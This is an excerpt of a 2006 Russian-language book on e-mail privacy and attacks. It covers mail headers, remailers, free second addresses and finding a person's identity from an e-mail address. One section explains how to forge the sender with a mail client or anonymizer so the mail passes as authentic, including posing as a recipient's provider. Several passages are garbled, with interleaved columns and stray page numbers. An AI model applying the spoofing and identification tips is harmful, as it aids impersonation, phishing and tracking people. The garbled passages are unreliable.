Максим Левин
УДК 004.5
ББК 32.973.26 018.2
Л363
E mail «безопасная»:
Взлом, «спам» и «хакерские» атаки
на системы электронной почты
Internet
Л363
Левин М.
E mail «безопасная»: Взлом, «спам» и «хакерские» атаки на системы
электронной почты Internet / Максим Левин.
М.: Бук пресс, 2006.
192 с.
Электронная почта, как впрочем и обычная, является инструментом
обмена информацией частного характера. Но она немедленно перестает
быть таковым, если нарушаются три важных условия. Первое: текст со
общения доступен только отправителю и адресату. Второе: уверенность в
том, что полученное письмо принадлежит тому человеку, чья подпись сто
ит под этим письмом. Третье: возможность отправить письмо, оставшись,
в случае необходимости, анонимным. В этой книге мы обсудим все эти
вопросы.
УДК 004.5
ББК 32.973.26 018.2
Содержание
Содержание
Содержание
Некоторые методы технического взлома
почтового ящика . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .59
Урви и ты кусок чужого мыла!!! . . . . . . . . . . . . . . . . . . . . . . . . . . .68
Маленькие хитрости твоего мыла . . . . . . . . . . . . . . . . . . . . . . . . . .73
Простая система защиты почтовых ящиков
Электронная почта в Internet
Введение
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .3
Принципы организации
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .4
Оптимальный выбор почтового клиента . . . . . . . . . . . . . . . . . . . . .7
Получение E Mail . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .7
Отправка E Mail . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .10
Ваш второй адрес . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .13
Идентификация пользователя по E MAIL . . . . . . . . . . . . . . . . . .15
Необходимость в защите . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .19
Защита от SPAM . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .22
Не подпускайте к себе Web шпионов . . . . . . . . . . . . . . . . . . . . . .35
Борьба за сетевую неприкосновенность . . . . . . . . . . . . . . . . . . . .37
Анонимный remailer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .40
Подмена IP адреса при отправке e mail . . . . . . . . . . . . . . . . . . . .44
IP адрес: определение, сокрытие, последствия . . . . . . . . . . . . . .45
. . . . . . . . . . . . . . . . . . . . . . . . . . .50
Защита ICQ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .54
Как найти расшаренные ресурсы в сети
с помощью ICQ и ISOAQ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .56
E mail «безопасная»
Хакерское программное обеспечение для ICQ . . . . . . . . . . . . . .87
Взлом мыла (user manual) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .89
Безопасная Windows XP
Физическая защита
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .101
Администрирование учетных записей . . . . . . . . . . . . . . . . . . . . .101
Защита файлов и каталогов (папок)
. . . . . . . . . . . . . . . . . . . . . .104
Защита реестра . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .106
Безопасность сервера SMB . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .107
Безопасность E mail
Чужое мыло — путь к паролям!
. . . . . . . . . . . . . . . .81
187
Безопасность сервера IIS
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .110
Аудит . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .112
Службы безопасности
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .116
Шифрование и безопасность
Тонкости работы с E mail . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .120
Кто ты такой? . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .126
Алгоритм шифрования с открытыми ключами . . . . . . . . . . . . .138
Шифруемся . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .139
Программа CryptoMania — одно из надежных
средств защиты информации . . . . . . . . . . . . . . . . . . . . . . . . . . . . .151
188
E mail «безопасная»
Содержание
File Transfer Protocol
Один из способов передачи информации
Переписываем файлы.
. . . . . . . . . . . . . . . . .156
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .157
Шаблоны групповых операций . . . . . . . . . . . . . . . . . . . . . . . . . . .160
Каталоги . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .160
Формирование адреса
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .163
Команды . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .164
FTP mail . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .168
Работа с FTP в среде WWW . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .168
Советы по использованию FTP
. . . . . . . . . . . . . . . . . . . . . . . . . .173
Приложения
Команды протокола SMTP . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .177
Коды возврата SMTP . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .178
Список терминов по FTP . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .180
Список использованной литературы . . . . . . . . . . . . . . . . . . . . . .185
E mail «безопасная»
189
Электронная почта в Internet
Электронная почта в Internet
Электронная почта в
Internet
терактивных систем коммуникаций, систем реального времени,
различных Internet телефонов и видеофонов, место электронной
почты среди других информационных технологий Internet прочно
и нерушимо.
Введение
Электронная почта — один из важнейших информационных
ресурсов Internet. Она является самым массовым средством элек
тронных коммуникаций. Любой из пользователей Internet имеет
свой почтовый ящик в сети. Если учесть, что через Internet мож
но принять или послать сообщения еще в два десятка междуна
родных компьютерных сетей, некоторые из которых не имеют on
line сервиса вовсе, то становится понятным, что почта
предоставляет возможности в некотором смысле даже более ши
рокие, чем просто информационный сервис Internet. Через почту
можно получить доступ к информационным ресурсам других
сетей.
В сознании большинства пользователей глобальной ком
пьютерной сети Internet сама эта сеть ассоциируется с тремя ос
новными информационными технологиями:
■ электронная почта (e mail);
■ файловые архивы FTP;
■ World Wide Web.
Каждая из этих технологий направлена на решение одной
из множества задач информационного обслуживания пользовате
лей сети.
Сеть Internet развивалась в первые свои годы как государст
венная. Это значит, что главным ее назначением был свободный
обмен информацией. Доступность Internet из высших учебных за
ведений только способствовала этой тенденции. Если электрон
ная почта — это основное средство коммуникаций, то основным
способом обмена программным обеспечением и регламентными
материалами в Internet стали FTP архивы. Это только в последнее
время Internet стала высокоскоростной информационной магист
ралью. Долгое время канал со скоростью 9600 бит/с был быстрым
каналом связи. В этом легко убедиться, стоит только вниматель
но почитать файлы настройки терминалов в ОС Unix (termcap).
Для работы по этим каналам связи и были разработаны такие про
токолы как Telnet и FTP. Упоминание этих двух протоколов вме
сте здесь не случайно. Telnet и FTP — это отличный пример ком
плексного решения проблемы. Все управление (сеанс связи и
выдача команд) происходит при обмене файлами по протоколу
Telnet и только собственно обмен файлами использует специаль
ный канал передачи данных, который определен в спецификации
протокола FTP (File Transfer Protocol).
При рассмотрении информационных технологий Internet
следует также принимать во внимание тот факт, что они все вза
имосвязаны и почти всегда можно получить доступ к одной из них
через другую.
Принципы организации
Электронная почта — это основное средство коммуникаций Электронная почта во многом похожа на обычную почто
                                                 Internet. Трудно себе представить пользователя сети, который не вую службу. Корреспонденция подготавливается пользователем на
                                                                                               знал бы как отправить или получить корреспонденцию от своего своем рабочем месте либо программой подготовки почты, либо
                                                                                                                                                   коллеги с другого конца света. Несмотря на бурное развитие ин просто обычным текстовым редактором. Обычно программа под
                                                                                                                                                                                                                                                                                                                     готовки почты вызывает текстовый редактор, который пользова
E mail «безопасная» 4
3
E mail «безопасная»
Электронная почта в Internet
Электронная почта в Internet
тель предпочитает всем остальным программам этого типа. Затем
пользователь должен вызвать программу отправки почты (про
грамма подготовки почты вызывает программу отправки автома
тически). Стандартной программой отправки является программа
sendmail. Sendmail работает как почтовый курьер, который достав
ляет обычную почту в отделение связи для дальнейшей рассылки.
В Unix системах программа sendmail сама является отделением
связи. Она сортирует почту и рассылает ее адресатам. Для поль
зователей персональных компьютеров, имеющих почтовые ящи
ки на своих машинах и работающих с почтовыми серверами че
рез коммутируемые телефонные линии, могут потребоваться
дополнительные действия. Так, например, пользователи почтовой
службы Relcom должны запускать программу UUPC, которая осу
ществляет доставку почты на почтовый сервер.
буется поддерживать линию все время доставки от отправителя к
получателю, а с другой стороны, бывает обидно получить возврат
сообщения через сутки после его отправки из за того, что допу
щена ошибка в имени пользователя. В целом же общие рекомен
дации таковы: если имеется возможность надежно работать в ре
жиме on line и это является нормой, то следует настраивать почту
для работы по протоколу SMTP, если линии связи плохие или on
line используется чрезвычайно редко, то лучше использовать
UUCP.
Структура взаимодействия участников почтового обмена
Для работы электронной почты в Internet разработан специ Основой любой почтовой службы является система адресов.
                                         альный протокол Simple Mail Transfer Protocol (SMTP), который Без точного адреса невозможно доставить почту адресату. В Inter
                                                              является протоколом прикладного уровня и использует транс net принята система адресов, которая базируется на доменном ад
                                                                                                                 портный протокол TCP. Однако, совместно с этим протоколом ресе машины, подключенной к сети. Например, для пользовате
                                                                                                                                                              используется и Unix Unix CoPy (UUCP) протокол. UUCP хоро ля paul машины с адресом polyn.net.kiae.su почтовый адрес будет
                                                                                                                                                                                       шо подходит для использования телефонных линий связи. Боль выглядеть как:
                                                                                                                                                                                                                                         шинство пользователей электронной почты Relcom реально поль paul@polyn.net.kiae.su.
                                                                                                                                                                                                                                                                                        зуются для доставки почты на узел именно этим протоколом. Таким образом, адрес состоит из двух частей: идентифика
                                                                                                                                                                                                                                                                                                                                        Разница между SMTP и UUCP заключается в том, что при ис тора пользователя, который записывается перед знаком «коммер
                                                                                                                                                                                                                                                                                                                                                                            пользовании первого протокола sendmail пытается найти машину ческого эй» — «@», и доменного адреса машины, который запи
                                                                                                                                                                                                                                                                                                                                                                                                                          получателя почты и установить с ней взаимодействие в режиме 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                             on line для того, чтобы передать почту в ее почтовый ящик. В слу 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         чае использования SMTP почта достигает почтового ящика полу 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         чателя за считанные минуты и время получения сообщения зави 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            сит только от того, как часто получатель просматривает свой 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              почтовый ящик. При использовании UUCP почта передается по 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           принципу «stop go», т.е. почтовое сообщение передается по це 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      почке почтовых серверов от одной машины к другой пока не до 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       стигнет машины получателя или не будет отвергнуто по причине 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           отсутствия абонента получателя. С одной стороны, UUCP позво 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ляет доставлять почту по плохим телефонным каналам, т.к. не тре 
E mail «безопасная» 6
5
E mail «безопасная»
Электронная почта в Internet
Электронная почта в Internet
сывается после знака «@». Адрес UUCP был бы записан как стро
ка вида:
net.kiae.su!polyn!paul
Программа рассылки почты Sendmail сама преобразует ад
реса формата Internet в адреса формата UUCP, если доставка со
общения осуществляется по этому протоколу.
Оптимальный выбор почтового клиента
На наш взгляд оптимальным выбором является Microsoft
Outlook Express версии 4.0 и выше. Прежде всего его отличает:
удобство использования, интуитивно понятный интерфейс, а так
же почта и конференции Usenet в одном флаконе.
Но, надо сказать, у него есть и одна неприятная особенность
(видимо так же один из «черных ходов» сделанных для спецслужб)
— он хранит (даже когда письма уже стерты) все письма, какие
только вы получали, удаляли или отправляли (хотя естественно вы
это не замечаете). Поэтому периодически рекомендуем удалять
(лучше невосстановимыми методами, например с помощью про
граммы Kremlin 2.1) эти файлы. Они расположены в директориях:
■ \Windows\Aplication\Microsoft\Outlook Express\Mail\
   — почта — здесь необходимо удалить все файлы с
                                          расширениями IDX и MBX.
■ \Windows\Aplication\Microsoft\Outlook Express\News\
   — новости — здесь необходимо удалить все файлы с
                                            расширениями NCH.
Получение E Mail
Иногда у пользователя возникает ситуация, в которой ему
хотелось бы выявить реального автора полученного сообщения.
Например, вы получили сообщение от вашей жены, в котором она
пишет, что уходит к другому. Вы можете либо вздохнуть с облег
чением, выпить на радости рюмку другую, и отправиться с друзь
E mail «безопасная»
7
ями на дачу праздновать это событие, либо попытаться выяснить,
не является ли это шуткой ваших друзей.
Ваши умные друзья могли легко изменить поле From в от
правленном сообщении, поставив туда вместо своего обратного
адреса хорошо известный вам адрес вашей жены, например
masha@flash.net. Как это делается, можно прочесть ниже, в главе
«Отправка E Mail». Так что стоящая перед нами задача сводится
к следующему: соответствует ли указанный адрес отправителя ад
ресу, с которого в действительности было отправлено сообщение.
Итак, каждое электронное сообщение содержит заголовок
(header), представляющий из себя служебную информацию о да
те отправления сообщения, названии почтовой программы, IP ад
ресе машины, с которой было отправлено сообщение, и т.п. Боль
шинство почтовых программ по умолчанию не отражают эту
информацию, но ее всегда можно просмотреть, либо открыв файл,
содержащий входящую почту, с помощью любого текстового ре
дактора, либо использовав функцию почтовой программы, позво
ляющую просматривать служебные заголовки, которая, как пра
вило, называется Show all headers. Что же мы видим? А вот что:
Received: by geocities.com (8.8.5/8.8.5) with ESMTP id
JAA16952 for ; Tue, 18 Nov 1997 09:37:40 0800 (PST)
Received: from masha.flash.net (really [209.30.69.99])
by endeavor.flash.net (8.8.7/8.8.5) with SMTP id LAA20454
for ; Tue, 18 Nov 1997 11:37:38 0600 (CST)
Message ID: <3471D27E.69A9@flash.net>
Date: Tue, 18 Nov 1997 11:38:07 0600
From: masha@flash.net
X Mailer: Mozilla 3.02 (Win95; U)
MIME Version: 1.0
To: petya@geocities.com
Subject: I don't love you any more, you *&$%# !!!!
Да, много всякого. Не вдаваясь в технические подробности,
в общих чертах: заголовки Received сообщают о пути, который
прошло сообщение в процессе пересылки по сети. Имена машин
8
E mail «безопасная»
Электронная почта в Internet
Электронная почта в Internet
(geocities.com, endeavor.flash.net) указывают на то, что сообщение,
скорее всего, пришло к вам в geocities.com из домена вашей же
ны flash.net. Если имена машин не имеют ничего общего с flash.net
(например, mailrelay.tiac.net), это повод задуматься о подлиннос
ти сообщения. Но самая главная строка для нас — последняя из
строк, начинающихся со слова Received:
Received: from masha.flash.net (really [209.30.69.99])
Она отражает имя машины (masha.flash.net) и уникальный
IP адрес, с которого было отправлено сообщение. Мы видим, что
домен (flash.net) соответствует адресу вашей жены. Впрочем, ва
ши умные друзья могли подделать и строку masha.flash.net (в Win
dows это делается через Control Panel ➪ Network ➪ TCP/IP Prop
erties ➪ DNS Configuration, указав masha и flash.net в полях Host и
Domain соответственно), поэтому для нас важно определить имя,
соответствующее данному IP адресу:
209.30.69.99.
Для определения имени, соответствующего цифровому ад
ресу, можно воспользоваться одной из доступных программ, на
пример WS Ping32, а лучше CyberKit. Набрав цифровой адрес, мы
даем команду NS LookUp (Name Server Lookup) и смотрим на по
лученный результат. Если имя определилось, то дальше все про
сто: если вы получили что нибудь вроде ppp303.flash.net или p28
dialup.flash.net, то сообщение отправлено вашей женой (или
кем то, имеющим счет в Flashnet, но тут вы уже бессильны что
либо выяснить). Если нечто весьма далекое от flash.net — она его
скорее всего не посылала.
Бывают ситуации, когда адрес не определяется. Не отчаи
вайтесь: воспользуйтесь функцией TraceRoute из той же програм
мы. Эта функция поможет проследить путь от вашей машины до
указанного IP адреса. Этот адрес (он будет последним в списке уз
лов, через которые сигнал прошел от вашего компьютера до ком
пьютера с указанным IP адресом) снова не определится, но по
следний из определившихся по имени узлов все таки укажет на
примерное географическое положение компьютера отправителя.
E mail «безопасная»
9
Еще более простым и изящным способом определения стра
ны и даже названия провайдера или сети является использования
этого адреса:
www.tamos.com/bin/dns.cgi
Итак, вы получили что нибудь вроде Brasilian Global Net
work. Ваша жена не бывала последнее время в Бразилии? Нет???
Ну тогда она от вас и не уходила. Вас разыграли. Будьте
бдительны!
Отправка E Mail
Заметим, что вполне добропорядочные граждане иногда хо
тят сохранить в тайне свою личность при высказывании своего
мнения, скажем автору сайта, пропагандирующего фашизм, или
президенту Лукашенко. Вопросы приобретения второго (аноним
ного) электронного адреса вынесены в отдельную главу «Ваш
второй адрес».
Remailer
Римейлер — это компьютер, получающий сообщение, и пе
реправляющий его по адресу, указанному отправителем. В про
цессе переадресовки все заголовки (headers), содержащие инфор
мацию об отправителе, уничтожаются, так что конечный
получатель лишен всякой возможности выяснить, кто автор сооб
щения. Remailer'ов в сети много, некоторые из них позволяют ука
зывать фиктивный адрес отправителя, большинство же прямо ука
зывают в заголовке, что сообщение анонимно. Вы можете
воспользоваться римейлером, послав сообщение по адресу remail
er@replay.com, указав Subject: remailer help. Вы получите файл с
подробными инструкциями об отправке анонимных сообщений.
Еще более простой способ — это отправиться по адресу:
www.replay.com/remailer/
Там расположен римейлер, позволяющий посылать сообще
ния прямо из WWW. На этом же сайте вы также можете восполь
зоваться цепочкой из ремейлеров, так что ваше сообщение прой
10
E mail «безопасная»
Электронная почта в Internet
Электронная почта в Internet
■ Использование вашей почтовой программы. Самый
                                           простой: поставьте в своей почтовой программе в
                                                                                  поле Return Address любой адрес, и если получатель
                                                                                                              письма не станет изучать его header, то он останется
                                                                                                                                                  в уверенности, что получил сообщение именного от
                                                                                                                                                                                          того, чей адрес указан в поле From. Очень просто и
                                                                                                                                                                                                                            очень мало надежно.
■ 
дет через несколько компьютеров, каждый из которых старатель
но уничтожит все заголовки предыдущего, хотя автор и не реко
мендует этого делать. Во первых, одного римейлера вполне доста
точно (если вы не параноик), во вторых, сообщение может
затеряться и не дойти до получателя, в третьих, оно может идти
очень долго. Пример полученного сообщения:
Date: Mon, 31 Mar 1997 12:33:23 +0200 (MET DST)
Subject: The rest is silence:
To: petya@glasnet.ru
From: nobody@REPLAY.COM (Anonymous)
Organization: Replay and Company UnLimited
X URL: http://www.replay.com/remailer/
X 001: Replay may or may not approve of the content of
this posting
X 002: Report misuse of this automated service to
abuse@replay.com
Выявить реального отправителя сообщения с использовани
ем римейлера теоретически можно, но очень сложно. Практичес
ки невозможно. На это способны лишь подлецы из разных там
ФСБ, ФАПСИ, ЦРУ и им подобных, им придется запастись ре
шением суда, чтобы римейлер открыл им требуемую информа
цию. А если вы использовали цепочку римейлеров, то им надо бу
дет обойти всех римейлеров в цепочке. Но если вы к тому же при
отправке через WWW интерфейс пользовались анонимным про
кси сервером и (или) анонимайзером, то шанс найти вас стано
виться еще намного меньше (да не забудьте еще отключить ис
пользование файлов Cookies).
Использование специальной программы — аноними
                                         затора. Таких программ несколько, попробуйте, ска
                                                                                 жем, AnonyMail. Вы заполняете поля From, To, Sub
                                                                                                   ject (тут все ясно), и поле Host, в котором вы
                                                                                                                           должны указать имя хоста, через который будет от
                                                                                                                                                                  правлена почта. Поскольку протокол отправки сооб
                                                                                                                                                                                                           щений SMTP не требует в подавляющем большинст
                                                                                                                                                                                                                                             ве случаев какой либо авторизации отправителя, вы
                                                                                                                                                                                                                                                                                      смело можете воспользоваться практически любым
                                                                                                                                                                                                                                                                                                                               именем хоста, желательно тем же, что имеет получа
                                                                                                                                                                                                                                                                                                                                                                      тель вашей почты. Это затруднит определение под
                                                                                                                                                                                                                                                                                                                                                                                                             линности сообщения для непродвинутого пользова
                                                                                                                                                                                                                                                                                                                                                                                                                                                      теля. Например, если вы хотите отправить письмо по
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              адресу kiska@frontier.net, укажите в поле Host адрес
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    frontier.net. Попробуйте отправить сообщение снача
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ла самому себе. Недостатки: IP адрес вашей машины
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         все таки будет отражен в header. Кроме того, поле To
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         в полученном сообщении превратится, скорее всего,
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  в Apparently To. Правда, мало кто обратит на это
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           внимание.
Итак, первое апреля. Вы умираете от желания сообщить Так что выбирайте подходящий для вас способ! Вышепере
                                           своему другу от имени его провайдера о том, что его счет закрыт численные способы вполне корректно работают и с русскими ко
                                                                                              за неуплату (сообщение с обратным адресом его провайдера). дировками. Поскольку de facto стандартом для пересылки сооб
                                                                                                                                              Описанные ниже способы хороши для розыгрышей, но мало при щений между разными компьютерами является KOI8 R,
                                                                                                                                                                                              годны, если вы хотите остаться действительно анонимны. Вари рекомендую использовать эту кодировку при посылке сообщений.
                                                                                                                                                                                                                                                анты таковы: Тогда ваше сообщение, скорее всего, будет правильно перекоди
                                                                                                                                                                                                                                                                                                                         ровано почтовым компьютером получателя.
E mail «безопасная» 12
11
E mail «безопасная»
Электронная почта в Internet
Электронная почта в Internet
Ваш второй адрес
Проблема защиты вашей частной жизни в сети ставит перед
нами вопрос об обладании вторым (третьим... десятым) электрон
ным адресом. Его хорошо иметь там, где вашу почту не будут чи
тать, и в том домене, географическая принадлежность которого
«нейтральна». В общем, все те же требования, что и ко второму
паспорту и гражданству. Такой адрес защитит вас от попыток вы
яснения вашей личности, даст вам возможность предоставлять
разные адреса разным корреспондентам в зависимости от их ста
туса, избавит от необходимости извещать всех ваших корреспон
дентов о вашем новом адресе, если вы сменили провайдера или
переехали в другую страну.
Существует довольно много служб, позволяющих бесплатно
получить второй электронный адрес. По способу отправки и по
лучения почты эти службы подразделяются на 3 основных типа.
Тип 1
Пример: http://www.europe.com. Службы этого типа дают
пользователю возможность перенаправлять полученную на новый
адрес корреспонденцию по адресу, указанному пользователем. Та
ким образом у вас уже должен быть какой либо адрес, т.к. «на
прямую» (с использованием протокола POP3) почту забрать нель
зя. Отправка почты осуществляется напрямую через хост этой
службы (протокол SMTP). Существует, правда, 60 дневный пери
од, в течение которого можно пользоваться и почтовым ящиком
(POP3), после истечения периода — за деньги. Вы самостоятель
но выбираете userid, а также домен из нескольких (бесплатно) или
многих (платно) предложенных имен, например: iname.com,
writeme.com, girls.com, boys.com etc. Выполнив несложные инст
рукции, вы становитесь обладателем нового адреса, скажем ohh
hhhhh@girls.com. В процессе заполнения анкеты вы указываете
свою страну (например, Албания), имя (ну тут вариантов мало,
все пишут Иван Петров или Петр Иванов), и адрес, на который
должна пересылаться вся приходящая корреспонденция. Этот ад
E mail «безопасная»
13
рес впоследствии легко изменить, это потребуется, когда вы сме
ните провайдера или уедете жить в княжество Лихтенштейн. Вот
и все! Недостаток: ваш настоящий адрес известен сотрудникам
службы.
Тип 2
Службы этого типа дают пользователю возможность как от
правлять почту напрямую, так и получать ее (POP3 и SMTP), так
что вам не нужен первичный адрес, либо он потребуется всего
лишь раз, при открытии счета. Для этих целей можно использо
вать адрес вашего приятеля или адрес в Hotmail. Пример:
www.geocities.com или www.netaddress.com (последняя имеет даже
еще более широкие возможности, позволяя помимо POP3 и SMTP
читать и отправлять почту из окна браузера, что позволяет отне
сти эту службу также и к Типу 3. Технология открытия счета при
мерно такая же. Преимущество: ваш настоящий первичный адрес
неизвестен, единственный «след», который вы оставляете, это ваш
IP адрес, с которого происходит чтение и отправка почты. Служ
бы также дают возможность перенаправлять почту на ваш первич
ный адрес, если есть такое желание. Кроме того, практически ва
шу почту смогут прочесть только администраторы службы, а не
ваш московский провайдер или ФАПСИ с ФСБ, хотя теоретиче
ски и это возможно.
Тип 3
Принципиально другой тип службы. Чтение и отправка поч
ты происходят не с использованием вашей любимой почтовой
программы, а прямо в окне вашего браузера.
Пример: http://www.hotmail.com. Переадресовка на ваш пер
вичный адрес невозможна. Преимущества: можно читать почту из
любого места, где есть доступ в WWW, будь то другая страна или
Интернет кафе в Южном Бутово, плюс опять же сложности слеж
ки за вашей почтой. Недостаток: не очень удобно работать с
Attachements, посылать можно не более одного за раз, и только с
14
E mail «безопасная»
Электронная почта в Internet
Электронная почта в Internet
использованием Netscape Navigator 2.0 и выше или Internet Explor
er 4.0 и выше. Совсем не сложно, зато как удобно!
Стоит также отметить: www.mailcity.com — которая позво
ляет создавать неограниченное количество копий и слепых копий
адресов, эта программа на основе Web — воплощенная мечта для
тех, кто занимается массовой рассылкой писем. И в заключение
еще одно важное соображение касательно privacy. При отправке
почты через любую из этих служб заголовок сообщения содержит
IP адрес, с которого отправлено сообщение. Даже Hotmail это де
лает. Но если при отправке сообщения с использованием почто
вых служб первых двух типов скрыть свой реальный IP адрес нель
зя (это связано с самим принципом работы протокола SMTP), то
при использовании почтовой службы третьего типа, т.е. при от
правке почты из окна браузера, лазейка все таки есть, что позво
лят говорить о том, что почтовый адрес третьего типа можно сде
лать практически полностью анонимным, достаточно лишь
воспользоваться одним из способов анонимизации своих путеше
ствий по сети. Другим способом отправить почту полностью ано
нимно остается использование римейлеров.
Идентификация пользователя по E MAIL
Да, действительно, а зачем устанавливать личность по изве
стному адресу электронной почты? А зачем ставят автоматичес
кий определитель номера (АОН) на телефон? А зачем существует
база данных, в которой по телефону можно определить имя и ад
рес человека? Много причин, начиная от чистого развлечения
(кто не хочет поиграть в Пинкертона?) до желания выяснить, кто
это с адресом someone@oxford.edu поздравляет вас каждый год с
днем рожденья и признается в любви. Кроме того, описывая ме
тодики такого поиска информации, автор хотел бы показать чи
тателю, как уязвима (или неуязвима) его privacy в сети.
Заметим сразу, что способы выяснения личности по извест
ному адресу e mail весьма разнообразны, причем ни один из них
не гарантирует успеха. Обратная задача решается довольно триви
E mail «безопасная»
15
ально: множество e mail directories (Four11, WhoWhere) позволя
ют найти по имени человека его адрес (если, конечно, он сам то
го захотел). Мы же рассмотрим задачу нетривиальную.
Finger
Воспользовавшись программой WS Ping32, а лучше CyberK
it вы получите возможность как бы направить ваш указательный
палец на любой адрес электронной почты и спросить «А это кто?».
Иногда вам могут ответить. Итак, мы задаем адрес (выдуманный
автором) someone@oxford.edu, получаем:
Login name:someone In real life: John McCartney
Directory:/usr/someone Shell: /usr/bin/csch
Last login Fri Aug18, 1995 on ttyv3 from
dialup.oxford.edu
No mail
No plan
OK, someone@oxfrord.edu принадлежит John McCartney. Де
ло сделано, хотя очень часто вы не получите никакого результа
та, либо строку следующего содержания:
Forwarding service denied
или:
Seems like you won't get what you are looking for;)
Тоже самое можно сделать, не перекачивая указанные про
граммы (хотя они и очень полезны и пригодятся не раз), а пойдя
по этому адресу в WWW, где расположен Web интерфейс, позво
ляющий получить тот же самый результат web.lm.com/sfw.html.
Следует заметить, что выполнение Finger с использованием
имени хоста (в данном случае oxford.edu) может не принести ни
какого результата, в то время как использование видоизмененно
го (альтернативного) имени хоста результат даст. Как узнать аль
тернативное имя хоста? Воспользуйтесь CyberKit, функция NS
LookUp. Введите имя www.oxford.edu и посмотрите на получен
ный результат. Он может содержать альтернативные имена хоста,
16
E mail «безопасная»
Электронная почта в Internet
Электронная почта в Internet
называемые aliases, ну скажем panda.oxford.edu. Попробуйте some
one@panda.oxford.edu, может сработать.
эти же службы иногда можно использовать для выполнения об
ратной задачи. Зайдя на какую либо из страниц:
http://www.four11.com
Иногда информация в ответ на finger запрос может быть вы
дана только пользователю из того же домена, к которому принад
лежит адрес, который вы хотите идентифицировать. Решение про
стое: найдите пользователя из искомого домена в Internet Relаy
Chat, и попросите его сделать finger запрос. Программа клиент
для IRC содержит функцию finger, так что никакой специальный
софт человеку, к которому вы обратились, не потребуется.
http://www.yahoo.com/search/people
http://www.bigbook.com
http://www.bigfoot.com
http://www.bigyellow.com
http://www.infospace.com
http://www.abii.com/lookupusa/adp/peopsrch.htm
Поиск в WWW
Очень просто: наберите адрес в www.altavista.digital.com и
нажмите Find! Есть вероятность, что вы либо найдете домашнюю
страницу искомого пользователя, либо упоминание о нем на дру
гих страницах. Там вполне может быть имя обладателя адреса, а
может и фото, если повезет.
Поиск в Usenet
Если человек с искомым адресом отправлял в какую нибудь
группу Usenet сообщение, то его можно разыскать по адресу. Для
этого можно воспользоваться AltaVista, которая позволяет произ
водить поиск во всех недавно отправленных в Usenet сообщени
ях. Заполните поле поиска искомым адресом прямо здесь (перед
адресом необходимо написать from:. После нажатия кнопки Find
откроется новое окно с результатами поиска.
Более предпочтительным вариантом является поиск в сис
теме DejaNews, т.к. если искомый адрес не найден среди недав
них сообщений, система предлагает поискать его среди старых.
Поиск также можно произвести прямо с этой страницы (from: пи
сать не нужно, просто адрес).
http://www.looksmart.com
http://www.switchboard.com
http://www.whowhere.com
http://www.dubna.ru/eros/ (поиск по русским ресурсам)
Можно не задавать имя человека, а задать лишь домен ис
комого адреса. Если пользователей, чьи адреса принадлежат к ис
комому домену, немного, то система в ответ на запрос выведет
список всех таких людей, но, как правило, не более сотни и без
указания части адреса, стоящей перед знаком @. Чтобы выяснить
адрес целиком, придется следовать по ссылке для каждого имени,
что займет много времени, если адресов много. Если же людей с
таким доменом больше ста, то поиск таким способом теряет
смысл. Другими словами человека из @aol.com или @netcom.com
так не найдешь.
Поиск в E mail Directories
Службы, позволяющие разыскать электронный адрес чело
века по его имени, широко представлены в Интернет. Между тем
E mail «безопасная»
17
18
E mail «безопасная»
Безопасность E mail
Безопасность E mail
Безопасность E mail
Представители компаний провайдеров в один голос говорят о
«возврате к старым временам» и с сожалением констатируют, что
